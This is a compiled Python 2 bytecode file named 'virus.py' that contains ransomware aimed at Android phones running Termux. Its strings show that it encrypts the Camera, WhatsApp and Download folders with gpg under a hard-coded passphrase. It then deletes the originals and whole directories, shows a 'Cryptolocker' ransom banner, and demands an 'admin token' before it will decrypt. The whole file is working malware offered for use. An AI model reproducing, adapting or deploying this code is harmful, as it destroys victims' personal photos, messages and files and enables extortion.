ó
Ý>^c           @   sm  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z y d  d l Z Wn+ e k
 r e  j	 d  e  j	 d  n Xd   Z
 d   Z d   Z d   Z d   Z e d	 k rie
   e   e   e  j	 d
  d GHe d  e d  e d  e j d  e d  Z e d k r_e d  Z d e k rWe   qfd GHqie   n  d S(   iÿÿÿÿNs!   pkg install gnupg -y &> /dev/nulls!   termux-setup-storage &> /dev/nullc          C   s  d }  xt  j d j |    D]t\ } } } xÛ | D]Ó } t  j j |  |  } t  j j |  sh q5 n  t  j j |  } | j d d  } t  j j |  |  } t  j j |  s¹ q5 n  t  j j |  }	 | j d d  }
 t  j j |  |  } t  j d j |   q5 Wt	 j	 d  } x | D] } t  j
 |  q"Wt	 j	 d	  } x | D] } t  j
 |  qOWt	 j	 d
  } x | D] } t  j
 |  q|Wq Wd  S(   Ns   /storage/emulated/0/DCIM/Cameras   {}s   .jpgs   .txts   .mp4s   .logs4   gpg --batch -c --passphrase diki0821 {} &> /dev/nulls%   /storage/emulated/0/DCIM/Camera/*.pngs%   /storage/emulated/0/DCIM/Camera/*.jpgs%   /storage/emulated/0/DCIM/Camera/*.mp4(   t   ost   walkt   formatt   patht   joint   isfilet   splitextt   replacet   systemt   globt   remove(   R   t   sdcardt   dirst   filest   filenamet
   infilenamet   oldbaset   newnamet   infilet   oldbaseet   newnameet   enct   filelistt   filet	   filelist1t   file1t	   filelist2t   file2(    (    s   virus.pyt   encrypt_one   s0    (  c          C   s   d }  x t  j d j |    D]o \ } } } x] | D]U } t  j j |  |  } t  j d j |   y t j d j |    Wq5 q5 Xq5 Wq Wd  S(   Ns   /storage/emulated/0/WhatsApps   {}s4   gpg --batch -c --passphrase diki0821 {} &> /dev/null(   R    R   R   R   R   R   t   shutilt   rmtree(   t   path2R   R   R   t	   filename2t   enc1(    (    s   virus.pyt   encrypt_two.   s    (c          C   s&  d }  xt  j d j |    D]ÿ \ } } } x9 | D]1 } t  j j |  |  } t  j d j |   q5 Wt j d  } x | D] } t  j |  q Wt j d  } x | D] }	 t  j |	  q­ Wt j d  }
 x |
 D] } t  j |  qÚ Wt j d  } x | D] } t  j |  qWq Wd  S(   Ns   /storage/emulated/0/Downloads   {}s4   gpg --batch -c --passphrase diki0821 {} &> /dev/nulls"   /storage/emulated/0/Download/*.apks"   /storage/emulated/0/Download/*.mp3s    /storage/emulated/Download/*.mp4s"   /storage/emulated/0/Download/*.txt(   R    R   R   R   R   R   R	   R
   (   t   path3R   R   R   t	   filename3t   enc2R   R   R   R   R   R   t	   filelist3t   file3(    (    s   virus.pyt   encrypt_three:   s"    (c         C   sM   xF |  d D]: } t  j j |  t  j j   t j t j   d  q Wd  S(   Ns   
gÉ?(   t   syst   stdoutt   writet   flusht   timet   sleept   random(   t   st   khaz(    (    s   virus.pyt   tikR   s    c          C   sK   t  d  }  t  d  } t j d j |  |   t j d j |   d  S(   Ns/   [1;92m[!][1;97mPath file for decrypt: [1;91ms*   [1;92m[!][1;97mNew name of file: [1;91ms+   gpg --passphrase diki0821 --decrypt {} > {}s5   mv /data/data/com.termux/files/home/ighack/{} /sdcard(   t	   raw_inputR    R   R   (   R   t   newfile(    (    s   virus.pyt   decryptX   s    t   __main__t   clearsb  

                                                    
[1;91m @@@@@@@ @@@@@@@  @@@ @@@ @@@@@@@  @@@@@@@  @@@@@@  
[1;91m!@@      @@!  @@@ @@! !@@ @@!  @@@   @!!   @@!  @@@ 
[1;91m!@!      @!@!!@!   !@!@!  @!@@!@!    @!!   @!@  !@! 
[1;97m:!!      !!: :!!    !!:   !!:        !!:   !!:  !!! 
[1;97m :: :: :  :   : :   .:     :          :     : :. :  s0   
[1;92m[!][1;97mYour data has been encrypt ...s+   [1;92m[!][1;97mEncrypt by Cryptolocker...s%   [1;92m[!][1;97mCheck your data now!i   s=   [1;92m[?][1;97mWant to decrypt? ([1;92my[1;97m/[1;91mn) t   ys%   [1;92m[!][1;97mAdmin token: [1;91mt    737dd6e287fb8d4e23e94cc19a82117ds   [!] Chat admin!(   R    R/   R-   t   zipfileR   R	   R)   t   gnupgt   ImportErrorR   R   R"   R(   R2   R5   t   __name__R.   R3   t   at   tokent   exit(    (    (    s   virus.pyt   <module>   sB   					  



